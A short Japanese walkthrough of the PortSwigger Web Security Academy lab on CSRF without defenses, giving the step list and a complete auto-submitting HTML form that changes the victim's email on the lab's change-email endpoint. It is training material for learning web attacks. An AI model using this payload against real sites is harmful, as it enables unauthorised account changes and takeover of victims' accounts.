# 防御策のない CSRF 脆弱性

次のハッキングラボを実施します  
https://portswigger.net/web-security/csrf/lab-no-defenses  
このラボの電子メール変更機能は CSRF に対して脆弱です。

- 1. BurpSuite を起動して、Proxy タブからブラウザを起動します
- 2. ブラウザからハッキングラボにアクセスします
- 3. 一般ユーザーでログインします
- 4. email アドレスの変更を行います
- 5. エクスプロイトサーバーに移動し、次の HTML を body に貼り付けて「Store」をクリックします。

```html
<form method="POST" action="https://0a28006a03f1108d8098711f00430003.web-security-academy.net/my-account/change-email">
  <input type="hidden" name="email" value="test@test" />
</form>
<script>
  document.forms[0].submit();
</script>
```

- 6. 「Deliver expoit to victim」をクリックします
- 7. 生成されたレスポンスにアクセスするとスクリプトが実行されます
